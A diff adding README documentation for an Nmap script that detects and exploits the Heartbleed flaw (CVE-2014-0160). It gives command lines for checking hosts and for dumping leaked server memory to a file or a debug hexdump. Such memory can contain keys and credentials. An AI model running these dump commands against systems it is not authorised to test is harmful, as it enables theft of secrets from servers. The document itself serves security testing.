@@ -166,3 +166,27 @@ nmap --script mop-discover.nse --script-args target=01:02:03:04:05:06 -e eth0
 ```
 
 *Note*: This might requires to set an IP address on the defined interface or else Nmap won't be able to use it. However, any IP will do.
+
+## ssl-heartbleed-dump.nse
+
+Discovers/Exploits Heartbleed/CVE-2014-0160. This script is basically like the Heartbleed detection script included in [official Nmap repositories](https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse) with the ability to dump the leaked memory to an outfile or print a hexdump with Nmap debug output.
+
+### Check if a host is vulnerable
+This runs on every SSL, FTP, SMTP and/or XMPP port.
+```
+$ nmap --script ./ssl-heartbleed-dump.nse host.tld
+```
+### Dump leaked memory from a vulnerable host
+Dumping leaked memory is enabled by increasing Nmap's debug level via -d flag.
+```
+$ nmap -d --script=./ssl-heartbleed-dump.nse host.tld
+```
+### Dump leaked memory into an outfile
+```
+$ nmap --script ./ssl-heartbleed-dump.nse --script-args 'ssl-heartbleed-dump.dumpfile=/tmp/heartbleed.dump' host.tld
+```
+### Run ssl-heartbleed.nse against every port
+Force the script to run on each port, regardless if the servie was detected or not.
+```
+$ nmap --script +./ssl-heartbleed-dump.nse host.tld
+```
